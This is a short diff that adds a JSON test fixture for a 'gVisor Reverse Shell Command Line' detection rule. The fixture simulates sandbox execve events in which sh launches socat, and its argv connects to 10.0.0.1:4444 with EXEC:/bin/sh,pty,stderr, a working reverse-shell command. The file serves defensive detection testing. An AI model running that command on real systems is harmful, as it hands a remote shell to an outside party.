@@ -1,0 +1,32 @@
+{
+  "description": "socat reverse shell using its documented upper-case EXEC address.",
+  "expect": [
+    "gVisor Reverse Shell Command Line"
+  ],
+  "events": [
+    {
+      "point": "sentry/execve",
+      "pid": 1,
+      "ppid": 0,
+      "comm": "sh",
+      "exe": "/bin/sh",
+      "argv": [
+        "/bin/sh"
+      ],
+      "lower_layer": true
+    },
+    {
+      "point": "sentry/execve",
+      "pid": 2,
+      "ppid": 1,
+      "comm": "socat",
+      "exe": "/usr/bin/socat",
+      "argv": [
+        "socat",
+        "TCP:10.0.0.1:4444",
+        "EXEC:/bin/sh,pty,stderr"
+      ],
+      "lower_layer": true
+    }
+  ]
+}
